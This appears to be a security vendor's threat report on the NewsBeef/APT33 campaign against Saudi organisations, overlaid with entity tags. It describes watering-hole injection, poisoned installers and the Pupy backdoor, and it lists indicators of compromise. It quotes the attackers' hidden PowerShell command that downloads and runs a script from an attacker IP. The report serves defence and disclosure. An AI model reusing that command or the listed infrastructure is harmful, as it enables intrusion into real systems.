@@ -1,0 +1,523 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 1/13
+
+By GReAT
+
+‘Twas <TIMESTAMP>the night before</TIMESTAMP>
+securelist.com/twas-the-night-before/91599
+
+Recently, the <COUNTRY>United States</COUNTRY> Cyber Command (<ORG>USCYBERCOM</ORG> Malware Alert
+@CNMF_VirusAlert) highlighted several <SOFTWARE>VirusTotal</SOFTWARE> uploads of theirs – and the
+executable objects relating to <TIMESTAMP>2016 – 2017</TIMESTAMP> <THREAT_ACTOR>NewsBeef/APT33</THREAT_ACTOR> activity are interesting for a
+variety of reasons. Before continuing, it’s important to restate yet again that we defend
+customers, and research malware and intrusions, regardless of their source.
+Accordingly, subscribers to our private <THREAT_ACTOR>APT</THREAT_ACTOR> intelligence reports receive unique and
+extraordinary data on the significant activity and campaigns of over 100 <THREAT_ACTOR>APT</THREAT_ACTOR>s from all
+over the world, including this <TIMESTAMP>2016-2017</TIMESTAMP> <THREAT_ACTOR>NewsBeef /APT33</THREAT_ACTOR> activity.
+
+<ORG>USCYBERCOM</ORG>’s <SOFTWARE>VirusTotal</SOFTWARE> executable object uploads appeared in our <TIMESTAMP>January 2017</TIMESTAMP>
+private report “<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> Delivers Christmas Presence”, an examination of a change in
+the tactics used in <TECHNIQUE>spear-phishing</TECHNIQUE> and <TECHNIQUE>watering hole attacks</TECHNIQUE> against Saudi Arabian
+targets. Two files uploaded by <ORG>USCYBERCOM</ORG> are of particular interest. These were first
+seen <TIMESTAMP>Dec 2016</TIMESTAMP> and <TIMESTAMP>Jan 2017</TIMESTAMP>:
+
+MD5: <IOC>d87663ce6a9fc0e8bc8180937b3566b9</IOC>, served as
+<IOC>jquerycode-download[.]live/flashplayer23pp_xa_install.exe</IOC>
+<IOC>jquerycode-download[.]live/chrome_update.exe</IOC>
+Detected as BSS:<MALWARE>Exploit.Win32.Generic</MALWARE>, <MALWARE>Trojan-Downloader.Win32.Powdr.a</MALWARE>, <MALWARE>Trojan-Downloader.MSIL.Steamilik.zzo</MALWARE>
+
+MD5: <IOC>9b1a06590b091d300781d8fbee180e75</IOC>, served as
+<IOC>jquerycode-download[.]live/citrixreceiver.exe</IOC>
+<IOC>jquerycode-download[.]live/citrixcertificate.exe</IOC>
+<IOC>ntg-sa[.]com/downloads/citrix_certificate.exe</IOC>
+Detected as BSS:<MALWARE>Exploit.Win32.Generic</MALWARE>, <MALWARE>Trojan-Downloader.PowerShell.Agent.ah</MALWARE>,
+<MALWARE>DangerousObject.Multi.Generic</MALWARE>
+
+In order to share insight into Cyber Command’s highlighted malware and its context,
+some of our private report’s content will be re-written here. The <TIMESTAMP>January 2017</TIMESTAMP> report
+followed up on other private reports published on the group’s <TECHNIQUE>BeEF</TECHNIQUE>-related activity in
+<TIMESTAMP>2015</TIMESTAMP> and <TIMESTAMP>2016</TIMESTAMP>. All of them cover a thread of <TIMESTAMP>mid-2015</TIMESTAMP> activity continuing into <TIMESTAMP>2016</TIMESTAMP>, then
+resetting and advancing in <TIMESTAMP>2016</TIMESTAMP> and into <TIMESTAMP>2017</TIMESTAMP>. Bear in mind that regardless of current
+leaks, which do not always present exhaustive information on group participants, activity
+from the region has had multiple overlaps and presents a confusion of internal
+dynamics…
+
+<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> Delivers Christmas Presence
+Examination of a change in tactics used in <TECHNIQUE>spearphishing</TECHNIQUE> and <TECHNIQUE>watering hole attacks</TECHNIQUE>
+against Saudi Arabian targets
+
+https://securelist.com/twas-the-night-before/91599/
+https://twitter.com/CNMF_VirusAlert
+https://www.virustotal.com/gui/file/28ebfe86217ed36ead5b429cadcd005338a0ae6207119729b53698b5e4a3ef3f/detection
+https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting
+https://securelist.com/freezer-paper-around-free-meat/74503/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 2/13
+
+Executive summary
+
+The <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> previously engaged in long-term, elaborate social engineering
+schemes that take advantage of popular social network platforms. Previous analysis of
+the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> indicates that the group focuses on Saudi Arabian (<COUNTRY>SA</COUNTRY>) and Western
+targets, and lacks advanced offensive technology development capabilities.
+
+In previous campaigns, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> relied heavily on its namesake technology, the
+<TECHNIQUE>Browser Exploitation Framework</TECHNIQUE> (<TECHNIQUE>BeEF</TECHNIQUE>). However, in the <TIMESTAMP>summer of 2016</TIMESTAMP>, the group
+deployed a new toolset that includes macro-enabled <SOFTWARE>Office</SOFTWARE> documents, <MALWARE>PowerSploit</MALWARE>, and
+the <MALWARE>Pupy</MALWARE> backdoor. The most recent <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> campaign uses this toolset in
+conjunction with <TECHNIQUE>spearphishing emails</TECHNIQUE>, <TECHNIQUE>links sent over social media/standalone private
+messaging applications</TECHNIQUE>, and <TECHNIQUE>watering hole attacks</TECHNIQUE> that leverage compromised high-
+profile websites (some belonging to the <ORG>SA government</ORG>). The group changed multiple
+characteristics year over year – tactics, the malicious <SOFTWARE>JavaScript</SOFTWARE> injection strategically
+placed on compromised websites, and command and control C2 infrastructure. 
+
+In a nutshell:
+
+The <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> actor deployed a new toolset in a campaign that focused primarily
+on Saudi Arabian targets;
+<TECHNIQUE>BeEF</TECHNIQUE> does not appear to be deployed as a part of the current campaign;
+Compromised government and infrastructure-related websites are injected with
+<SOFTWARE>JavaScript</SOFTWARE> that geolocates and redirects visitors to spoofed, attacker-controlled
+web-servers;
+Improvements in <SOFTWARE>JavaScript</SOFTWARE> injection and obfuscation may extend server
+persistence;
+<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> continues to deploy malicious macro-enabled <SOFTWARE>Office</SOFTWARE> documents,
+poisoned legitimate <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>Chrome</SOFTWARE> installers, <MALWARE>PowerSploit</MALWARE>, and <MALWARE>Pupy</MALWARE> tools
+
+Technical Analysis
+
+The <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> campaign is divided into two main attack vectors, <TECHNIQUE>spearphishing</TECHNIQUE> and
+strategic web compromise (<TECHNIQUE>watering hole</TECHNIQUE>) attacks. The group’s spearphishing
+component uses malicious, macroenabled, <SOFTWARE>Microsoft Office</SOFTWARE> documents that deliver
+PowerShell scripts. The scripts download poisoned installers (e.g. <SOFTWARE>Flash</SOFTWARE>, <SOFTWARE>Citrix Client</SOFTWARE>,
+and <SOFTWARE>Chrome</SOFTWARE>) from an online presence (in at least one case, the group spoofed a
+legitimate, well-known IT services organization). Once the installer is downloaded to a
+victim machine, it runs <MALWARE>PowerSploit</MALWARE> scripts that in turn download and execute a full-
+featured <MALWARE>Pupy</MALWARE> backdoor.
+
+On <TIMESTAMP>December 25, 2016</TIMESTAMP>, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> stood up a server to host a new set of
+<SOFTWARE>Microsoft Office</SOFTWARE> documents (maintaining malicious macros and PowerShell scripts) to
+support its spear-phishing operations. The group sent these documents (or links to them)
+to targets via email, and over social network and standalone messaging clients.
+
+To compromise websites and servers, the group identified vulnerable sites and injected
+obfuscated <SOFTWARE>JavaScript</SOFTWARE> that redirected visitors to <THREAT_ACTOR>NewsBeef</THREAT_ACTOR>-controlled hosts (which
+tracked victims and served malicious content). These compromised servers include
+
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 3/13
+
+<ORG>Saudi Arabian government</ORG> servers and other high-value organizational identities
+relevant to their targets.
+
+Targets, social engineering, delivery chain
+
+The majority of <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> targets that our researchers have observed are located in <COUNTRY>SA</COUNTRY>.
+Targeting profiles include:
+
+Government financial and administrative organizations
+Government health organizations
+Engineering and technical organizations
+One British labor related government organization (targeted multiple times)
+
+The bulk of the targets were affected through strategic web compromises, especially via
+compromised government servers. However, <SOFTWARE>Kaspersky Security Network</SOFTWARE> (<SOFTWARE>KSN</SOFTWARE>) records
+also contain links that victims clicked from the <SOFTWARE>Outlook</SOFTWARE> web client “outlook.live.com” as
+well as attachments arriving through the <SOFTWARE>Outlook</SOFTWARE> desktop application. This behavior falls
+in line with previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> operations, where the group used other standalone
+messaging clients to send malicious links. Interestingly, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> set up its server using
+the hosting provider “<ORG>Choopa, LLC, US</ORG>”, the same hosting provider that the group used
+in attacks over the <TIMESTAMP>summer of 2016</TIMESTAMP>.
+
+The domain “<IOC>ntg-sa[.]com</IOC>” appears to
+be an attempt by the <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> actor
+to spoof the legitimate Saudi IT services organization, “<ORG>National Technology Group</ORG>” (<ORG>NTG</ORG>) at,
+“<IOC>ntg.com[.]sa</IOC>”. The malicious
+documents served at the spoofed
+website are shown below:
+
+https://securelist.com/twas-the-night-before/91599/ipdomain/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 4/13
+
+<ORG>NTG</ORG> is a legitimate company that provides IT services and support to <ORG>SA government</ORG>
+organizations and communications firms (as well as international financial groups and
+retailers), making it a high-value identity. Spoofing the identity of an IT service provider is
+a particularly important asset to threat actors that can abuse the inherent trust of IT
+organizations to push software (which may appear suspicious if served from another
+source). <ORG>NTG</ORG>’s IT focus and client list likely aided <THREAT_ACTOR>NewsBeef</THREAT_ACTOR>’s delivery of malicious
+PowerShell-enabled Office documents and poisoned installers.
+
+https://securelist.com/twas-the-night-before/91599/ntgsa/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 5/13
+
+In <TIMESTAMP>December 2016</TIMESTAMP>, the following active URLs were served from the spoofed <ORG>NTG</ORG>
+identity. All of the poisoned installers are technologies that an IT support service may be
+expected to deliver.
+
+<IOC>hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe</IOC>
+<IOC>hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe</IOC>
+<IOC>hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe</IOC>
+
+In this scenario, the poisoned <SOFTWARE>Flashplayer</SOFTWARE>, <SOFTWARE>Citrix</SOFTWARE>, or <SOFTWARE>Chrome</SOFTWARE> installer drops the file
+“<IOC>install.bat</IOC>”. The batch file runs the PowerShell command:
+
+powershell.exe -w hidden -noni -nop -c “iex(New-Object
+System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)
+
+The command downloads “eiloShaegae1”, another PowerShell downloader script. This
+second PowerShell downloader script downloads and runs the payload; a <MALWARE>PowerSploit</MALWARE>
+ReflectivePEInjection script, “<IOC>hxxp://139.59.46[.]154:3485/IMo8oosieVai</IOC>”.
+
+The script maintains and then decodes a base64 string. This base64 string, is the <MALWARE>Pupy</MALWARE>
+backdoor DLL, which is loaded and run in-memory, never touching the disk. This <MALWARE>Pupy</MALWARE>
+backdoor immediately communicates with <IOC>139.59.46[.1]54</IOC> over obfs3, posting collected
+system data and retrieving commands.
+
+This selection of “The Threebfuscator” for command and control (C2) communications is
+interesting, because it is an obfuscating protocol used to mask Tor communications. It is
+possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness
+against outbound connection monitoring.
+
+Another notable spoofed domain used during this campaign is the “<IOC>maps-modon[.]club</IOC>”
+domain. The domain “<IOC>maps.modon.gov[.]sa</IO\>” was compromised in <TIMESTAMP>December 2016</TIMESTAMP>, and
+the “<IOC>maps-modon[.]club</IOC>” domain created on <TIMESTAMP>December 8, 2016</TIMESTAMP>. The domain shared the
+
+https://securelist.com/twas-the-night-before/91599/ntgsa_home/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 6/13
+
+same IP address (<IOC>45.76.32[.]252</IOC>) as “<IOC>ntg-sa[.]com</IOC>”. Although we did not observe any
+malicious documents retrieved from that domain, it is likely that the domain served the
+same documents as <IOC>ntg-sa[.]com</IOC>. The filenames of the malicious <SOFTWARE>Office</SOFTWARE> documents
+(hosted at the spoofed <ORG>NTG</ORG> site) are relevant to typical IT and contracting resources and
+indicate that this scheme relies on effective social engineering tactics related to human
+resources and IT activities.
+
+In other schemes, the attackers sent
+macro-enabled <SOFTWARE>Office</SOFTWARE> attachments
+from spoofed law firm identities (or
+other relevant service providers) to
+targets in <COUNTRY>SA</COUNTRY>. The law firm in this
+scheme is based in the <COUNTRY>United Kingdom</COUNTRY> and is the sole location for
+targets outside of <COUNTRY>SA</COUNTRY> for this campaign.
+Below is a screenshot of a fake legal
+proposal in <SOFTWARE>Word</SOFTWARE> doc format,
+containing malicious macros and
+PowerShell code.
+
+The malicious document follows the same chain as the poisoned <SOFTWARE>Flash player</SOFTWARE> or <SOFTWARE>Chrome Installer</SOFTWARE>:
+
+https://securelist.com/twas-the-night-before/91599/spears/
+https://securelist.com/twas-the-night-before/91599/lawspear/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 7/13
+
+Compromised servers and injected <SOFTWARE>JavaScript</SOFTWARE>
+
+Starting in <TIMESTAMP>October 2016</TIMESTAMP>, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> compromised a set of legitimate servers (shown
+below), and injected <SOFTWARE>JavaScript</SOFTWARE> to redirect visitors to <IOC>hxxp://analytics-google[.]org:69/Check.aspx:</IOC>
+
+The entire list of compromised servers
+is exclusively Saudi Arabian, and
+includes organizations from the
+following industries:
+
+Energy services for industrial
+processes
+<INDUSTRY>Telecom engineering and
+implementation services</INDUSTRY>
+<INDUSTRY>Shipping and logistics</INDUSTRY>
+<INDUSTRY>Metal engineering and manufacturing</INDUSTRY>
+<INDUSTRY>Information technology services</INDUSTRY>
+<INDUSTRY>Cement and building materials</INDUSTRY>
+
+These recent attacks against
+legitimate servers (when compared to previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> activity) indicate that
+<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> operators have improved their technical skills, specifically their ability to
+covertly inject <SOFTWARE>JavaScript</SOFTWARE> code into served web pages. Their injection and obfuscation
+techniques enable the actor to serve the same <SOFTWARE>JavaScript</SOFTWARE> with every page visit to the
+“<TECHNIQUE>watering hole</TECHNIQUE>” site as well as increase the difficulty of identifying the malicious
+<SOFTWARE>JavaScript</SOFTWARE> source on compromised sites.
+
+For example, on a <ORG>Saudi government</ORG> website, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> delivered packed
+<SOFTWARE>JavaScript</SOFTWARE> into the bottom of a referenced script that is included in every page served
+from the site (the packed and unpacked <SOFTWARE>JavaScript</SOFTWARE> is shown below). The <SOFTWARE>JavaScript</SOFTWARE>
+forces visiting web browsers to collect and send (via a POST request) web browser,
+browser version, country of origin, and IP address data to the attacker controlled server
+“<IOC>jquerycodedownload[.]live/check.aspx</IOC>”.
+
+It is likely that this collection of visitor information represents an attempt to limit the
+number of infections to a specific target subset and reduce the attacker’s operational
+footprint. Although we did not identify injected <SOFTWARE>JavaScript</SOFTWARE> related to the “<IOC>analytics-
+google[.]org/check.aspx</IOC>” redirections, it is likely that it performed similar data collection
+
+https://securelist.com/twas-the-night-before/91599/pupychain/
+https://securelist.com/twas-the-night-before/91599/compromisedservers1/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 8/13
+
+and exfiltration (via POST). This technique appears to be an improvement over the
+simple .JPG beaconing which researchers observed in previous <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> <TECHNIQUE>watering hole attacks</TECHNIQUE>. Packed <SOFTWARE>JavaScript</SOFTWARE>:
+
+The most trafficked of the compromised sites (which redirect to “<IOC>jquerycode-
+download[.]live</IOC>”) appears to be the government site at “<IOC>scsb.gov[.]sa/portal/</IOC>”. A high
+volume of redirections from the compromised site continues into <TIMESTAMP>mid-January 2017</TIMESTAMP>.
+
+https://securelist.com/twas-the-night-before/91599/packedjs/
+https://securelist.com/twas-the-night-before/91599/unpacked/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 9/13
+
+Below is a list of compromised websites and the associated URL that serves the
+injected, second layer <SOFTWARE>JavaScript</SOFTWARE>. Note that the <SOFTWARE>JavaScript</SOFTWARE> resource changes on every
+compromised website among many other referenced <SOFTWARE>JavaScript</SOFTWARE> sources, making it
+difficult to track down the source of the malicious script per site:
+
+<IOC>www.taqa.com[.]sa/Scroll-jquery.js</IOC>
+
+https://securelist.com/twas-the-night-before/91599/taqa/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 10/13
+
+<IOC>199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js</IOC>
+
+Multiple other relevant sites were compromised and redirecting as well.
+
+The <MALWARE>Pupy</MALWARE> backdoor
+
+<MALWARE>Pupy</MALWARE> is an open source, multi-platform (<SOFTWARE>Windows</SOFTWARE>, <SOFTWARE>Linux</SOFTWARE>, <SOFTWARE>OSX</SOFTWARE>, <SOFTWARE>Android</SOFTWARE>), multi-function
+backdoor. The backdoor is mainly written in <SOFTWARE>Python</SOFTWARE> and uses code from other open
+source attack tools like <MALWARE>PowerSploit</MALWARE>, <MALWARE>Mimikatz</MALWARE>, <MALWARE>laZagne</MALWARE>, etc. <MALWARE>Pupy</MALWARE> can generate
+backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for
+<SOFTWARE>Windows</SOFTWARE>, ELF binary/.so for <SOFTWARE>Linux</SOFTWARE>, reflective DLLs (x86/x64), pure <SOFTWARE>Python</SOFTWARE> files,
+PowerShell, apk, and Rubber Ducky script (<SOFTWARE>Windows</SOFTWARE>).
+
+The malicious DLL deployed by <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> contains <SOFTWARE>Python</SOFTWARE> code, a <SOFTWARE>Python</SOFTWARE> interpreter,
+and the MSVC runtime library as well as code that loads the <SOFTWARE>Python</SOFTWARE> interpreter, runs
+<SOFTWARE>Python</SOFTWARE> code and exports some functions for <SOFTWARE>Python</SOFTWARE>. A configuration string contains
+base64-encoded <SOFTWARE>Python</SOFTWARE> code (packed with zlib) with transport configuration and
+information about C2 server addresses.
+
+When initiated, the <SOFTWARE>Python</SOFTWARE> code attempts to retrieve and use SOCKS/HTTP proxy
+settings from the victim’s computer. The <SOFTWARE>Python</SOFTWARE> code then tries to initiate a reverse
+connection to the C2 server (<IOC>139.59.46[.]154:3543</IOC>) using a TCP protocol with RSA+AES
+traffic encryption and obfs3 transport using default keys from <MALWARE>Pupy</MALWARE> sources.
+
+https://securelist.com/twas-the-night-before/91599/199099gov/
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 11/13
+
+After a successful connection, <THREAT_ACTOR>NewsBeef</THREAT_ACTOR> <MALWARE>Pupy</MALWARE> sends information about the infected
+computer and waits for commands (which take the form of modules) from the C2 server.
+The C2 server can send modules with <SOFTWARE>Python</SOFTWARE> code and compiled <SOFTWARE>Python</SOFTWARE> C extensions.
+The main functionality of the backdoor is implemented in packages (<SOFTWARE>Python</SOFTWARE> code,
+compiled <SOFTWARE>Python</SOFTWARE> C extensions, compiled executable files) and modules (<SOFTWARE>Python</SOFTWARE> code).
+Modules can directly access <SOFTWARE>Python</SOFTWARE> objects on the remote client using the RPyC
+module. The <SOFTWARE>Python</SOFTWARE> modules win32com, win32api, and ctypes are used to interact with
+the Win32 API. Attackers can use standard modules or write their own. All modules are
+executed in the memory (a <MALWARE>Pupy</MALWARE> process can migrate between processes using the
+corresponding module).
+
+Conclusion
+Previous reports on the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> noted the group’s reliance on open-source tools
+to launch simple, yet effective attacks. Historically, the group has used <TECHNIQUE>BeEF</TECHNIQUE> to track
+targets and deliver malicious payloads. However, as this recent campaign indicates, the
+<THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> appears to have shifted its intrusion toolset away from <TECHNIQUE>BeEF</TECHNIQUE> and
+towards macro-enabled malicious <SOFTWARE>Office</SOFTWARE> documents, <MALWARE>PowerSploit</MALWARE>, and <MALWARE>Pupy</MALWARE>. Despite
+this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse
+of servers hosted by the service providers <ORG>Choopa</ORG> and <ORG>Atlantic.net</ORG>.
+
+The improvements in tactics, techniques and procedures appears to have paid off. The
+most recent campaign indicates that the group was able to compromise a larger number
+of sites including valuable, high-profile <ORG>SA government</ORG> identities. However, despite these
+improvements in technology, the <THREAT_ACTOR>NewsBeef APT</THREAT_ACTOR> continues to rely on social engineering
+schemes and open-source tools – attributes that increase the chances of identification.
+
+<THREAT_ACTOR>NewsBeef</THREAT_ACTOR> attacks against Saudi Arabian organizations and individuals (as well as
+targets in the European Union) are likely to continue. Additionally, researchers expect
+that as the group evolves, its tasking will expand to other organizations doing business
+with, or connected to Saudi Arabian organizations and individuals.
+
+Due to the group’s specific target set, it is crucial that <COUNTRY>SA</COUNTRY> security teams, administrators,
+and developers (especially web application administrators/developers) update their
+<SOFTWARE>WordPress</SOFTWARE>, <SOFTWARE>Joomla</SOFTWARE>, and <SOFTWARE>Drupal</SOFTWARE>-based web applications and plugins – as these assets
+are actively scanned and exploited by this <THREAT_ACTOR>APT</THREAT_ACTOR>.
+
+Appendix
+
+Related Object MD5 (executable code, malicious office
+documents, <SOFTWARE>JavaScript</SOFTWARE>, powershell, etc)
+
+<IOC>f4d18316e367a80e1005f38445421b1f</IOC>
+<IOC>638b74a712a7e45efc9bec126b0f2d87</IOC>
+<IOC>45b0e5a457222455384713905f886bd4</IOC>
+<IOC>19cea065aa033f5bcfa94a583ae59c08</IOC>
+<IOC>ecfc0275c7a73a9c7775130ebca45b74</IOC>
+
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+https://securelist.com/twas-the-night-before/91599/ 12/13
+
+<IOC>1b5e33e5a244d2d67d7a09c4ccf16e56</IOC>
+<IOC>fa72c068361c05da65bf2117db76aaa8</IOC>
+<IOC>43fad2d62bc23ffdc6d301571135222c</IOC>
+<IOC>ce25f1597836c28cf415394fb350ae93</IOC>
+<IOC>03ea9457bf71d51d8109e737158be888</IOC>
+<IOC>edfc37461fa66716b53333fd7f841a8e</IOC>
+<IOC>623e05dd58d86da76fdfcf9b57032168</IOC>
+<IOC>6946836f2feb98d6e8021af6259a02dd</IOC>
+<IOC>f4d18316e367a80e1005f38445421b1f</IOC>
+<IOC>d87663ce6a9fc0e8bc8180937b3566b9</IOC>
+<IOC>f9adf73bf1cdd7cd278e5137d966ddd4</IOC>
+<IOC>b8373f909fa228c2b6e7d69f065f30fb</IOC>
+<IOC>9b1a06590b091d300781d8fbee180e75</IOC>
+<IOC>bcafe408567557289003c79f745f7713</IOC>
+<IOC>45b0e5a457222455384713905f886bd4</IOC>
+<IOC>83be35956e5d409306a81e88a1dc89fd</IOC>
+<IOC>c2165155fcba5b737ee70354b5244be3</IOC>
+<IOC>444c93e736194a01bf3b319e3963d746</IOC>
+<IOC>0ed61b6f1008000c6dfcd3d842b21971</IOC>
+<IOC>3fb33a2747b39a9b1c5c1e41fade595e</IOC>
+<IOC>b34fd14105be23480c44cfdf6eb26807</IOC>
+
+URLs
+
+Hosting malicious docs, executables, PowerShell and <MALWARE>Pupy</MALWARE> backdoors
+
+<IOC>moh.com-ho[.]me/Health_insurance_plan.doc</IOC>
+<IOC>moh.com-ho[.]me/Health_insurance_registration.doc</IOC>
+<IOC>mol.com-ho[.]me/cv_itworx.doc</IOC>
+<IOC>mci.com-ho[.]me/cv_mci.doc</IOC>
+<IOC>jquerycode-download[.]live/flashplayer23pp_xa_install.exe</IOC>
+<IOC>jquerycode-download[.]live/citrixcertificate.exe</IOC>
+<IOC>jquerycode-download[.]live/chrome_update.exe</IOC>
+<IOC>jquerycode-download[.]live/CitrixReceiver.exe</IOC>
+<IOC>jquerycode-download[.]live/check.aspx</IOC>
+<IOC>jquerycode-download[.]live/CheckLog.aspx</IOC>
+<IOC>https://ntg-sa[.]com/downloads/citrix_certificate.exe</IOC>
+<IOC>https://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe</IOC>
+<IOC>https://ntg-sa[.]com/Downloads/Chrome_Update.exe</IOC>
+<IOC>http://ntg-sa[.]com/cv.doc</IOC>
+<IOC>http://ntg-sa[.]com/cv_itworx.doc</IOC>
+<IOC>http://ntg-sa[.]com/cv_mci.doc</IOC>
+<IOC>http://ntg-sa[.]com/discount_voucher_codes.xlsm</IOC>
+<IOC>http://ntg-sa[.]com/Health_insurance_plan.doc</IOC>
+<IOC>http://ntg-sa[.]com/Health_insurance_registration.doc</IOC>
+<IOC>http://ntg-sa[.]com/job_titles.doc</IOC>
+<IOC>http://ntg-sa[.]com/job_titles_itworx.doc</IOC>
+<IOC>http://ntg-sa[.]com/job_titles_mci.doc</IOC>
+
+
+
+<TIMESTAMP>7/5/2019</TIMESTAMP> ‘Twas <TIMESTAMP>the night before</TIMESTAMP> | Securelist
+
+<IOC>https://securelist.com/twas-the-night-before/91599/ 13/13</IOC>
+
+<IOC>http://ntg-sa[.]com/Password_Policy.xlsm</IOC>
+<IOC>45.32.186.33</IOC>
+<IOC>http://itworx.com-ho[.]me/*</IOC>
+<IOC>http://mci.com-ho[.]me/*</IOC>
+<IOC>http://moh.com-ho[.]me/*</IOC>
+<IOC>http://mol.com-ho[.]me/*</IOC>
+<IOC>http://ntg-sa[.]com/*</IOC>
+<IOC>taqa.com[.]sa/arabic/resumes/resume.doc</IOC>
+<IOC>taqa.com[.]sa/arabic/resumes/resume.doc</IOC>
+<IOC>taqa.com[.]sa/arabic/resumes/cv-taqa.doc</IOC>
+<IOC>taqa.com[.]sa/arabic/images/certificate.crt.exe</IOC>
+<IOC>taqa.com[.]sa/arabic/tempdn/cv-taqa.doc</IOC>
+<IOC>104.218.120[.]128/pro.bat</IOC>
+<IOC>104.218.120[.]128/msservice-a-2.exe</IOC>
+<IOC>104.218.120[.]128/msservice-a-4.exe</IOC>
+<IOC>104.218.120[.]128/check.aspx</IOC>
+<IOC>104.218.120[.]128:69/checkFile.aspx</IOC>
+<IOC>139.59.46[.]154/IMo8oosieVai</IOC>
+<IOC>139.59.46[.]154:3485/eiloShaegae1</IOC>
+<IOC>69.87.223[.]26/IMo8oosieVai</IOC>
+<IOC>69.87.223[.]26:8080/eiloShaegae1</IOC>
+<IOC>69.87.223[.]26:8080/p</IOC>
+
+Additional C2
+
+<IOC>analytics-google[.]org:69/check.aspx</IOC>
+<IOC>analytics-google[.]org/checkFile.aspx</IOC>
+<IOC>jquerycode-download[.]live/check.aspx</IOC>
+<IOC>jquerycode-download[.]live/checkFile.aspx</IOC>
+<IOC>go-microstf[.]com/checkFile.aspx</IOC>
+<IOC>104.218.120[.]128/check.aspx</IOC>
+<IOC>104.218.120[.]128:69/checkFile.aspx</IOC>
+
+
